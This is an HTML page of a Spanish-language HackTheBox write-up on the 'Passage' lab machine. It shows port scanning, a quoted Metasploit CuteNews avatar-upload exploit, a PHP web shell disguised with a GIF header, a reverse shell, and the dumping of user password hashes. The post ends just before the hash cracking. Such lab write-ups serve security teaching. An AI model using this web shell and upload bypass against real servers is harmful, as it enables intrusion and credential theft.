@@ -1,0 +1,616 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+<link rel="icon" href="/assets/images/piece.png">
+
+<title>Firtsmiracle Blog de Ciberseguridad</title>
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Maquina Passage - htb writeup | Firtsmiracle blog de Ciberseguridad</title>
+<meta name="generator" content="Jekyll v3.9.0" />
+<meta property="og:title" content="Maquina Passage - htb writeup" />
+<meta name="author" content="Firtsmiracle" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="El dia de hoy vamos a estar resolviendo la maquina Passage de hackthebox que es una maquina Linux de dificultad Media. Para explotar esta maquina abusaremos una vulnerabilidad de Cute News, haremos analisis de codigo para descubrir ciertos recursos y finalmente para escalar privilegios como el usuario root nos aprovecharemos de USBCreator" />
+<meta property="og:description" content="El dia de hoy vamos a estar resolviendo la maquina Passage de hackthebox que es una maquina Linux de dificultad Media. Para explotar esta maquina abusaremos una vulnerabilidad de Cute News, haremos analisis de codigo para descubrir ciertos recursos y finalmente para escalar privilegios como el usuario root nos aprovecharemos de USBCreator" />
+<link rel="canonical" href="http://localhost:4000/hackthebox/htb-writeup-Passage" />
+<meta property="og:url" content="http://localhost:4000/hackthebox/htb-writeup-Passage" />
+<meta property="og:site_name" content="Firtsmiracle blog de Ciberseguridad" />
+<meta property="og:image" content="http://localhost:4000/assets/images/HTB/htb-writeup-Arctic/passage.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2023-04-17T00:00:00+00:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="http://localhost:4000/assets/images/HTB/htb-writeup-Arctic/passage.png" />
+<meta property="twitter:title" content="Maquina Passage - htb writeup" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Firtsmiracle"},"dateModified":"2023-04-17T00:00:00+00:00","datePublished":"2023-04-17T00:00:00+00:00","description":"El dia de hoy vamos a estar resolviendo la maquina Passage de hackthebox que es una maquina Linux de dificultad Media. Para explotar esta maquina abusaremos una vulnerabilidad de Cute News, haremos analisis de codigo para descubrir ciertos recursos y finalmente para escalar privilegios como el usuario root nos aprovecharemos de USBCreator","headline":"Maquina Passage - htb writeup","image":"http://localhost:4000/assets/images/HTB/htb-writeup-Arctic/passage.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hackthebox/htb-writeup-Passage"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/images/piece.png"},"name":"Firtsmiracle"},"url":"http://localhost:4000/hackthebox/htb-writeup-Passage"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+<!-- CSS -->
+<link href="/assets/css/prism.css" rel="stylesheet">
+<!-- SCSS can't be processed by browser, so we use .CSS to fix it -->
+<link href="/assets/css/theme.css" rel="stylesheet">
+<link href="/assets/css/modal.css" rel="stylesheet">
+
+<script src="/assets/js/jquery.min.js"></script>
+
+</head>
+
+
+
+
+<body>
+	<!-- defer loading of font and font awesome -->
+	<noscript id="deferred-styles">
+		<link href="https://fonts.googleapis.com/css?family=Sen:400,700&display=swap" rel="stylesheet">
+        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
+	</noscript>
+
+
+<!-- Begin Sidebar Navigation
+================================================== -->
+
+<div class="sidebar">    
+</div>   
+<div class="nav-icon">
+    <div class="hamburger-bar"></div>
+</div>
+<div id="blackover-nav" class="blackover"></div>
+<nav id="menu">
+    <ul>
+        <h2>BLog de Ciberseguridad</h2><br><br>
+        <li><a href="/" id="menu-home">Inicio</a></li>
+        <li><a href="/categories#articulos">Artículos</a></li>
+        <li><a href="/categories#hackthebox" id="menu-hackthebox">HackTheBox</a></li>
+        <li><a href="/categories#novedades" id="menu-tryhackme">Novedades</a></li>
+        <li><a href="/tags">Tags</a></li>
+        <li><a href="/about" id="menu-aboutme">Información</a></li>
+    </ul>   
+</nav>
+
+<script src="/assets/js/lunr.js"></script>
+
+<style>
+    
+</style>
+
+<div class="wrap-search">
+    <div class="d-flex align-items-center ml-auto">
+        <i class="fas fa-search show-search"></i>
+        <form class="bd-search ml-3" onSubmit="return lunr_search(document.getElementById('lunrsearch').value);">
+            <input type="text" class="form-control bigradius text-small launch-modal-search" id="lunrsearch" name="q" maxlength="255" value="" placeholder="Buscar..."/>
+        </form>
+    </div>
+</div>
+
+<div id="lunrsearchresults">
+    <ul></ul>
+</div>
+
+<script src="/assets/js/lunrsearchengine.js"></script>
+
+
+
+<!-- End Sidebar Navigation
+================================================== -->
+
+<div class="site-content ">
+
+<div class="container">
+
+    <!-- Site Logo/Name
+    ================================================== -->
+   
+    <a class="navbar-brand" href="/">
+        <img src="/assets/images/piece.png" alt="Firtsmiracle blog de Ciberseguridad">
+    </a>  
+   
+
+    <!-- Site Tag
+    ================================================== -->
+    
+
+    <!-- Content
+    ================================================== -->
+    <div class="main-content">
+        <script defer src="/assets/js/lightbox.js"></script>
+
+<div class="entry-header">
+    <!-- Post Title -->
+    <h1 class="posttitle">Maquina Passage - htb writeup</h1>
+    <!-- Author & Date  Box -->
+    
+    
+    <div class="d-flex align-items-center mt-4">
+        <div>
+            
+            <img class="author-thumb" src="https://www.gravatar.com/avatar/?s=250&d=mm&r=x" alt="">
+            
+        </div>            
+        <div>
+        Firtmiracle <a targ="_blank" class="text-info"></a> el 
+        <span class="post-date"><time class="post-date" datetime="2023-04-17">17 Apr 2023</time></span>           
+        
+        </div>            
+    </div>
+    
+</div>
+
+<!-- Adsense under title if enabled from _config.yml (change your pub id and slot) -->
+
+
+<!-- Featured Image -->
+
+<div class="entry-featured-image">
+    
+    <img class="featured-image " src="/assets/images/HTB/htb-writeup-Arctic/passage.png" alt="Maquina Passage - htb writeup">
+    
+</div>
+
+
+<!-- Content -->
+<!-- Post, Page Content
+================================================== -->
+<div class="article-post">
+    <!-- Toc if any -->
+    
+    <!-- End Toc -->
+    <p>El dia de hoy vamos a estar resolviendo la maquina Passage de <code>hackthebox</code> que es una maquina <code>Linux</code> de dificultad <code>Media</code>. Para explotar esta maquina abusaremos una vulnerabilidad de <code>Cute News</code>, haremos analisis de codigo para descubrir ciertos recursos y finalmente para escalar privilegios como el usuario <code>root</code> nos aprovecharemos de <code>USBCreator</code></p>
+
+<p>Vamos a comenzar como de costrumbre creando un directorio con el nombre de la maquina:</p>
+
+<pre><code class="language-bash">❯ mkdir Passage
+❯ ls
+ Passage
+</code></pre>
+
+<pre><code class="language-bash">❯ which mkt
+mkt () {
+	mkdir {nmap,content,scripts}
+}
+❯ mkt
+❯ ls
+ content   exploits   nmap
+</code></pre>
+
+<h2 id="enumeración">Enumeración <a href="#enumeración">#</a></h2>
+
+<p>Ahora que tenemos nuestros directorios proseguimos con la fase de Enumeración, empezamos mandando una traza a la ip de la maquina victima con el comando <code>ping</code>:</p>
+
+<pre><code class="language-bash">❯ ping -c 1 10.10.10.206
+PING 10.10.10.206 (10.10.10.206) 56(84) bytes of data.
+64 bytes from 10.10.10.206: icmp_seq=1 ttl=63 time=210 ms
+
+--- 10.10.10.206 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 210.072/210.072/210.072/0.000 ms
+</code></pre>
+<p>Vemos que la maquina nos responde con un <code>ttl</code> de <code>63</code> correspondiente a una maquina <code>linux</code>, ahora procederemoscon el escaneo de puertos con la ayuda de <code>nmap</code>:</p>
+
+<h3 id="escaneo-de-puertos">Escaneo de Puertos</h3>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><a href="#enumeracion">-p-</a></td>
+      <td style="text-align: left">Escaneamos todos los 65535 puertos.</td>
+    </tr>
+    <tr>
+      <td><a href="#enumeracion">–open</a></td>
+      <td style="text-align: left">Solo los puertos que estén abiertos.</td>
+    </tr>
+    <tr>
+      <td><a href="#enumeracion">-v</a></td>
+      <td style="text-align: left">Permite ver en consola lo que va encontrando (verbose).</td>
+    </tr>
+    <tr>
+      <td><a href="#enumeracion">-oG</a></td>
+      <td style="text-align: left">Guarda el output en un archivo con formato grepeable para que mediante una funcion de <a href="https://s4vitar.github.io/">S4vitar</a> nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre <code>openPorts</code>:</p>
+
+<pre><code class="language-java">❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.206 -oG openPorts
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-04-17 16:25 GMT
+Initiating SYN Stealth Scan at 16:25
+Scanning 10.10.10.206 [65535 ports]
+Discovered open port 22/tcp on 10.10.10.206
+Discovered open port 80/tcp on 10.10.10.206
+Completed SYN Stealth Scan at 16:25, 16.83s elapsed (65535 total ports)
+Nmap scan report for 10.10.10.206
+Host is up, received user-set (0.12s latency).
+Scanned at 2023-04-17 16:25:13 GMT for 17s
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack ttl 63
+80/tcp open  http    syn-ack ttl 63
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 17.00 seconds
+           Raw packets sent: 82801 (3.643MB) | Rcvd: 82648 (3.306MB)
+</code></pre>
+
+<p>Despues de realizarse el escaneo vemos que los puertos abiertos corresponden a  <code>22 ssh</code> , <code>80 http</code>.</p>
+
+<h3 id="escaneo-de-version-y-servicios">Escaneo de Version y Servicios.</h3>
+
+<pre><code class="language-java">❯ nmap -sCV -p22,80 10.10.10.206 -oN targeted
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-04-17 16:27 GMT
+Nmap scan report for 10.10.10.206
+Host is up (0.20s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 17:eb:9e:23:ea:23:b6:b1:bc:c6:4f:db:98:d3:d4:a1 (RSA)
+|   256 71:64:51:50:c3:7f:18:47:03:98:3e:5e:b8:10:19:fc (ECDSA)
+|_  256 fd:56:2a:f8:d0:60:a7:f1:a0:a1:47:a4:38:d6:a8:a1 (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-title: Passage News
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 20.80 seconds
+</code></pre>
+
+<p>Visulizamos la versión de los puertos escaneados:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Puerto</th>
+      <th>Servicio</th>
+      <th>Versión</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>22</td>
+      <td>SSH</td>
+      <td>OpenSSH 7.2p2</td>
+    </tr>
+    <tr>
+      <td>80</td>
+      <td>HTTP</td>
+      <td>Apache httpd 2.4.18</td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="explotación">Explotación <a href="#explotación">#</a></h2>
+
+<p>Primeramente ya que <code>nmap</code> nos reporto que el puerto <code>80</code> se encuentra abiertos usaremos <code>whatweb</code> para tratar identificar a que nos estamos enfrentando y ver el gestor de contenido web desde consola.</p>
+
+<pre><code class="language-bash">❯ whatweb http://10.10.10.206
+http://10.10.10.206 [200 OK] Apache[2.4.18], Bootstrap, Cookies[CUTENEWS_SESSION], Country[RESERVED][ZZ], Email[kim@example.com,nadav@passage.htb,paul@passage.htb,sid@example.com], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.206], JQuery, PoweredBy[CuteNews:], Script[text/javascript], Title[Passage News]
+</code></pre>
+
+<blockquote>
+  <p>Cutenews: CuteNews es un gestor de noticias/sistema de publicación blog, creado por el equipo de desarrolladores de CutePHP</p>
+</blockquote>
+
+<p>La herramienta nos reporta que se esta usando el gestor de contenido correspondiente a <code>Cutenews</code>, ademas vemos que se puede estar aplicando virtual hosting. Por lo que procederemos a agregar el dominio a nuestro <code>/etc/hosts</code></p>
+
+<pre><code class="language-bash">❯ echo "10.10.10.206 passage.htb" &gt;&gt; /etc/hosts
+</code></pre>
+
+<p>Vamos a proceder a abrir el servicio web en el navegador</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Passage/cute1.PNG" alt="" /></p>
+
+<p>A primera vista no vemos algo muy relevante asi que probaremos a ver el codigo fuente de la pagina.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Passage/cute2.PNG" alt="" /></p>
+
+<p>Visualizamos que existe una ruta de nombre <code>CuteNews</code> y tenemos capacidad de acceso a la ruta que concretamente se trata de un panel de login.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Passage/cute3.PNG" alt="" /></p>
+
+<p>Encontramos algo muy interesante en el panel de login ya que podemos ver la versión de <code>CuteNews</code> que se esta utilizando.</p>
+
+<p>Verificamos si hay algun exploit publico <code>searchsploit</code> y efectivamente existen vulnerabilidades asociadas a esta versión especifica <code>2.1.2</code></p>
+
+<pre><code class="language-bash">❯ searchsploit cutenews 2.1.2
+----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------
+ Exploit Title                                                                                                                                       |  Path
+----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------
+CuteNews 2.1.2 - 'avatar' Remote Code Execution (Metasploit)                                                                                         | php/remote/46698.rb
+CuteNews 2.1.2 - Arbitrary File Deletion                                                                                                             | php/webapps/48447.txt
+CuteNews 2.1.2 - Authenticated Arbitrary File Upload                                                                                                 | php/webapps/48458.txt
+CuteNews 2.1.2 - Remote Code Execution                                                                                                               | php/webapps/48800.py
+----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------
+Shellcodes: No Results
+Papers: No Results
+</code></pre>
+
+<p>Tenemos exploits que corresponden a <code>RCE</code>, el primero de ellos nos habla de algo asociado con <code>avatar</code>, podemos investigar de que trata el exploit trayendonoslo a nuestro directorio. Pero primero recordemos que en el panel de login, existia la opción de registrar un nuevo usuario.</p>
+
+<p>Vamos a proceder a registrarnos en el servicio.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Passage/cute4.PNG" alt="" /></p>
+
+<p>Una vez registrados, obervamos en nuestro panel un campo correspondiente a <code>avatar</code>, y si recordamos antes vimos un <code>exploit</code> asociado que justamente nos hablaba de algo de <code>avatar</code>. Quiero pensar entonces que al este campo corrsponder a una subida de archivos, entonces la <code>RCE</code> en el exploit la obtiene de un mal control en la subida de archivos.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Passage/cute5.PNG" alt="" /></p>
+
+<p>Para estar seguros podemos examinar el exploit y ver que que trata.</p>
+
+<p>Efectivamente dentro encontramos una función que lo que hace es realizar una petición en <code>avatar</code> subiendo un arhivo <code>php</code> que incluye una cabecera <code>GIF</code> y de Content-Type <code>image/png</code>: esto para mediante el uso de <code>Magic Numbers</code> hacer un <code>bypass</code> aprovechando la mala sanitización en el campo de subida y este nos detecte el archivo como un <code>GIF</code>.</p>
+
+<pre><code class="language-ruby">def upload_shell(cookie, check)
+
+    res = send_request_cgi({
+      'method'   =&gt; 'GET',
+      'uri'      =&gt; normalize_uri(target_uri.path, "index.php?mod=main&amp;opt=personal"),
+      'cookie'   =&gt; cookie
+    })
+
+    signkey = res.body.split('__signature_key" value="')[1].split('"')[0]
+    signdsi = res.body.split('__signature_dsi" value="')[1].split('"')[0]
+    # data preparation
+    fname = Rex::Text.rand_text_alpha_lower(8) + ".php"
+    @shell = "#{fname}"
+    pdata = Rex::MIME::Message.new
+    pdata.add_part('main', nil, nil, 'form-data; name="mod"')
+    pdata.add_part('personal', nil, nil, 'form-data; name="opt"')
+    pdata.add_part("#{signkey}", nil, nil, 'form-data; name="__signature_key"')
+    pdata.add_part("#{signdsi}", nil, nil, 'form-data; name="__signature_dsi"')
+    pdata.add_part('', nil, nil, 'form-data; name="editpassword"')
+    pdata.add_part('', nil, nil, 'form-data; name="confirmpassword"')
+    pdata.add_part("#{datastore['USERNAME']}", nil, nil, 'form-data; name="editnickname"')
+    pdata.add_part("GIF\r\n" + payload.encoded, 'image/png', nil, "form-data; name=\"avatar_file\"; filename=\"#{fname}\"")
+    pdata.add_part('', nil, nil, 'form-data; name="more[site]"')
+    pdata.add_part('', nil, nil, 'form-data; name="more[about]"')
+    data = pdata.to_s
+</code></pre>
+
+<p>Puedes ver este articulo, para comprender a mayor detalle el uso de <code>Magic Numbers</code></p>
+
+<ul>
+  <li><img src="https://en.wikipedia.org/wiki/List_of_file_signatures" alt="https://en.wikipedia.org/wiki/List_of_file_signatures" /></li>
+</ul>
+
+<p>Como ya sabemos en que consiste la vulnerabilidad, en vez de hacer uso del exploit. Crearemos un archivo <code>php</code> con esas caracteristicas, que nos permita la ejecución de comandos mediante el uso de un parametro definido <code>cmd</code> en conjunto con la función <code>shell_exec</code>. Seguidamente subiremos el archivo.</p>
+
+<pre><code class="language-php">❯ cat cmd.php
+GIF8;
+
+&lt;?php
+    echo "&lt;pre&gt;" . shell_exec($_REQUEST['cmd']) . "&lt;/pre&gt;";
+?&gt;
+</code></pre>
+<p><img src="/assets/images/HTB/htb-writeup-Passage/cute6.PNG" alt="" /></p>
+
+<p>El archivo se sube correctamente y consecuentemente inspeccionamos la ruta en donde se encuentra nuestro archivo.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Passage/cute8.PNG" alt="" /></p>
+
+<p>Vamos a la ruta indicada de nombre <code>uploads</code> y si vemos nuestro archivo subido.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Passage/cute9.PNG" alt="" /></p>
+
+<p>Verificamos que podemos ejecutar comandos y estamos como <code>www-data</code></p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Passage/cute10.PNG" alt="" /></p>
+
+<p>Lo que sigue sera mandarnos una <code>reverse shell</code> a nuestra maquina haciendo uso <code>bash</code> y poniendonos en escucha con <code>ncat</code></p>
+
+<blockquote>
+  <p>Recordatorio no olvidar urlencodear el caracter <code>&amp;</code> a <code>%26</code> para evitar problemas al procesarse la petición.</p>
+</blockquote>
+
+<p>Enviamos la petición</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Passage/cute11.PNG" alt="" /></p>
+
+<p>y recibimos la conexión como el usuario <code>www-data</code>.</p>
+
+<pre><code class="language-bash">❯ ncat -nlvp 443
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::443
+Ncat: Listening on 0.0.0.0:443
+Ncat: Connection from 10.10.10.206.
+Ncat: Connection from 10.10.10.206:43080.
+bash: cannot set terminal process group (1683): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@passage:/var/www/html/CuteNews/uploads$ whoami
+whoami
+www-data
+</code></pre>
+
+<p>Como es de costumbre, vamos a obtener una <code>tty</code> full interactiva con los comandos de siempre.</p>
+
+<pre><code class="language-bash">www-data@passage:/var/www/html/CuteNews/uploads$ script /dev/null -c bash
+script /dev/null -c bash
+Script started, file is /dev/null
+www-data@passage:/var/www/html/CuteNews/uploads$ ^Z
+zsh: suspended  ncat -nlvp 443
+❯ stty raw -echo; fg
+[1]  + continued  ncat -nlvp 443
+                                reset xterm
+www-data@passage:/var/www/html/CuteNews/uploads$ export TERM=xterm
+www-data@passage:/var/www/html/CuteNews/uploads$ export SHELL=bash
+www-data@passage:/var/www/html/CuteNews/uploads$ stty rows 45 columns 174
+</code></pre>
+
+<blockquote>
+  <p>Cabe recordar que el numero de <code>rows</code> y <code>columns</code> corresponden a las dimensiones de tu pantalla y puedes verificar haciendo uso del comando <code>stty size</code></p>
+</blockquote>
+
+<p>Existe un repositorio de <code>CuteNews</code> publico en github:</p>
+
+<ul>
+  <li><img src="https://github.com/CuteNews/cutenews-2.0" alt="https://github.com/CuteNews/cutenews-2.0" /></li>
+</ul>
+
+<p>Aqui nos habla que para agregar comentarios, perfiles o cualquier información, no necesita hacer uso de un gestor de base de datos como <code>mysql</code>. Revisando el repositorio podemos ver que la data lo almacena en un directorio de nombre <code>cdata</code>.</p>
+
+<pre><code class="language-bash">www-data@passage:/var/www/html/CuteNews/cdata$ ls 
+Default.tpl	    backup	 category.db.php  confirmations.php  idnews.db.php   news	 postponed_news.txt  template		  users.txt
+Headlines.tpl	    btree	 comments.txt	  csrf.php	     installed.mark  news.txt	 replaces.php	     unapproved_news.txt
+archives	    cache	 conf.php	  flood.db.php       ipban.db.php    newsid.txt  rss.tpl	     users
+auto_archive.db.php  cat.num.php  config.php	  flood.txt	     log	     plugins	 rss_config.php      users.db.php
+</code></pre>
+
+<p>Dentro de este directorio en el directorio <code>users</code>, almacena los datos de los usuarios registrados en un archivo cuyo nombre se computa al tomar los dos primeros caracteres del <code>usuario</code> en <code>md5</code> y le agrega la extensión <code>php</code>.</p>
+
+<p>Como yo cree el usuario <code>fmiracle</code>, los primeros caracteres corresponderian a <code>cb</code></p>
+<pre><code class="language-bash">❯ echo -n "fmiracle" | md5sum
+cb151a66aabded3ee89f616afab7b6c9
+</code></pre>
+
+<p>Vemos que si existe un archivo <code>cb.php</code> en el directorio asi que procedemos a leerlo</p>
+
+<pre><code class="language-bash">www-data@passage:/var/www/html/CuteNews/cdata/users$ cat cb.php 
+&lt;?php die('Direct call - access denied'); ?&gt;
+YToxOntzOjQ6Im5hbWUiO2E6MTp7czo4OiJmbWlyYWNsZSI7YTo5OntzOjI6ImlkIjtzOjEwOiIxNjgxNzUwODAyIjtzOjQ6Im5hbWUiO3M6ODoiZm1pcmFjbGUiO3M6MzoiYWNsIjtzOjE6IjQiO3M6NToiZW1haWwiO3M6MjE6ImZtaXJhY2xlQGZtaXJhY2xlLmNvbSI7czo0OiJuaWNrIjtzOjg6ImZtaXJhY2xlIjtzOjQ6InBhc3MiO3M6NjQ6IjQ4Yjg0MWJlYTIwNWZkYjJkNjAxNDBhODljOGIzMDA2MThmYWNhMjAwZDI2YmQyY2Q0YmQyYzBmNTk4MTgzODMiO3M6NDoibW9yZSI7czo2MDoiWVRveU9udHpPalE2SW5OcGRHVWlPM002TURvaUlqdHpPalU2SW1GaWIzVjBJanR6T2pBNklpSTdmUT09IjtzOjY6ImF2YXRhciI7czoyMzoiYXZhdGFyX2ZtaXJhY2xlX2NtZC5waHAiO3M6NjoiZS1oaWRlIjtzOjA6IiI7fX19www-d
+</code></pre>
+
+<p>Ya que el formato esta en <code>base64</code> usaremos un <code>base64 -d</code> para decodificarla y vemos el <code>hash</code> correspondiente a la contraseña.</p>
+
+<pre><code class="language-bash">www-data@passage:/var/www/html/CuteNews/cdata/users$ echo "YToxOntzOjQ6Im5hbWUiO2E6MTp7czo4OiJmbWlyYWNsZSI7YTo5OntzOjI6ImlkIjtzOjEwOiIxNjgxNzUwODAyIjtzOjQ6Im5hbWUiO3M6ODoiZm1pcmFjbGUi3M6MzoiYWNsIjtzOjE6IjQiO3M6NToiZW1haWwiO3M6MjE6ImZtaXJhY2xlQGZtaXJhY2xlLmNvbSI7czo0OiJuaWNrIjtzOjg6ImZtaXJhY2xlIjtzOjQ6InBhc3MiO3M6NjQ6IjQ4Yjg0MWJlYTIwNWZkYjJkNjAxNDBhODljOGIzMDA2MThmWNhMjAwZDI2YmQyY2Q0YmQyYzBmNTk4MTgzODMiO3M6NDoibW9yZSI7czo2MDoiWVRveU9udHpPalE2SW5OcGRHVWlPM002TURvaUlqdHpPalU2SW1GaWIzVjBJanR6T2pBNklpSTdmUT09IjtzOjY6ImF2YXRhciI7czoyMzoiYXZhdGFyX2ZtXJhY2xlX2NtZC5waHAiO3M6NjoiZS1oaWRlIjtzOjA6IiI7fX19www-data@passage" | base64 -d; echo
+a:1:{s:4:"name";a:1:{s:8:"fmiracle";a:9:{s:2:"id";s:10:"1681750802";s:4:"name";s:8:"fmiracle";s:3:"acl";s:1:"4";s:5:"email";s:21:"fmiracle@fmiracle.com";s:4:"nick";s:8:"fmiracle";s:4:"pass";s:64:"48b841bea205fdb2d60140a89c8b300618faca200d26bd2cd4bd2c0f59818383";s:4:"more";s:60:"YToyOntzOjQ6InNpdGUiO3M6MDoiIjtzOjU6ImFib3V0IjtzOjA6IiI7fQ==";s:6:"avatar";s:23:"avatar_fmiracle_cmd.php";s:6:"e-hide";s:0:"";}}}
+                                          base64: invalid input
+</code></pre>
+
+<p>Vamos a realizar el mismo proceso para todos los archivos y visualizaremos los hashes correspondientes a sus contraseñas</p>
+
+<pre><code class="language-bash">www-data@passage:/var/www/html/CuteNews/cdata/users$ cat * | grep -v "denied" | base64 -d; echo
+a:1:{s:5:"email";a:1:{s:16:"paul@passage.htb";s:10:"paul-coles";}}a:1:{s:2:"id";a:1:{i:1598829833;s:6:"egre55";}}a:1:{s:5:"email";a:1:{s:15:"egre55@test.com";s:6:"egre55";}}a:1:{s:4:"name";a:1:{s:5:"admin";a:8:{s:2:"id";s:10:"1592483047";s:4:"name";s:5:"admin";s:3:"acl";s:1:"1";s:5:"email";s:17:"nadav@passage.htb";s:4:"pass";s:64:"7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1";s:3:"lts";s:10:"1592487988";s:3:"ban";s:1:"0";s:3:"cnt";s:1:"2";}}}a:1:{s:2:"id";a:1:{i:1592483281;s:9:"sid-meier";}}a:1:{s:5:"email";a:1:{s:17:"nadav@passage.htb";s:5:"admin";}}a:1:{s:5:"email";a:1:{s:15:"kim@example.com";s:9:"kim-swift";}}a:1:{s:2:"id";a:1:{i:1592483236;s:10:"paul-coles";}}a:1:{s:4:"name";a:1:{s:9:"sid-meier";a:9:{s:2:"id";s:10:"1592483281";s:4:"name";s:9:"sid-meier";s:3:"acl";s:1:"3";s:5:"email";s:15:"sid@example.com";s:4:"nick";s:9:"Sid Meier";s:4:"pass";s:64:"4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88";s:3:"lts";s:10:"1592485645";s:3:"ban";s:1:"0";s:3:"cnt";s:1:"2";}}}a:1:{s:2:"id";a:1:{i:1592483047;s:5:"admin";}}a:1:{s:5:"email";a:1:{s:15:"sid@example.com";s:9:"sid-meier";}}a:1:{s:4:"name";a:1:{s:10:"paul-coles";a:9:{s:2:"id";s:10:"1592483236";s:4:"name";s:10:"paul-coles";s:3:"acl";s:1:"2";s:5:"email";s:16:"paul@passage.htb";s:4:"nick";s:10:"Paul Coles";s:4:"pass";s:64:"e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd";s:3:"lts";s:10:"1592485556";s:3:"ban";s:1:"0";s:3:"cnt";s:1:"2";}}}a:1:{s:4:"name";a:1:{s:9:"kim-swift";a:9:{s:2:"id";s:10:"1592483309";s:4:"name";s:9:"kim-swift";s:3:"acl";s:1:"3";s:5:"email";s:15:"kim@example.com";s:4:"nick";s:9:"Kim Swift";s:4:"pass";s:64:"f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca";s:3:"lts";s:10:"1592487096";s:3:"ban";s:1:"0";s:3:"cnt";s:1:"3";}}}a:1:{s:4:"name";a:1:{s:6:"egre55";a:11:{s:2:"id";s:10:"1598829833";s:4:"name";s:6:"egre55";s:3:"acl";s:1:"4";s:5:"email";s:15:"egre55@test.com";s:4:"nick";s:6:"egre55";s:4:"pass";s:64:"4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc";s:4:"more";s:60:"YToyOntzOjQ6InNpdGUiO3M6MDoiIjtzOjU6ImFib3V0IjtzOjA6IiI7fQ==";s:3:"lts";s:10:"1598834079";s:3:"ban";s:1:"0";s:6:"avatar";s:26:"avatar_egre55_spwvgujw.php";s:6:"e-hide";s:0:"";}}}a:1:{s:2:"id";a:1:{i:1592483309;s:9:"kim-swift";}}
+</code></pre>
+
+<p>Ahora intentaremos crackear todos estos hashes</p>
+
+</div>
+
+<!-- Rating -->
+
+
+<!-- Author Box if enabled from _config.yml -->
+<!-- Author Box -->
+
+
+
+
+<!-- Comments if not disabled with comments: false -->
+<!-- Comments
+================================================== -->
+ 
+<div class="comments">
+    <button class="btn btn-dark show-comments">Comentarios</button>         
+    <div id="comments">  
+        <h4 class="mb-4">Comments</h4>                 
+            <section class="disqus">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        var disqus_shortname = 'demowebsite'; 
+        var disqus_developer = 0;
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = window.location.protocol + '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</section>
+     
+    <div class="clearfix"></div>              
+    </div>    
+</div>       
+
+
+
+<!-- Share -->
+<div class="share">
+    <p>
+        ⚉
+    </p>
+    <ul>
+        <li class="ml-1 mr-1">
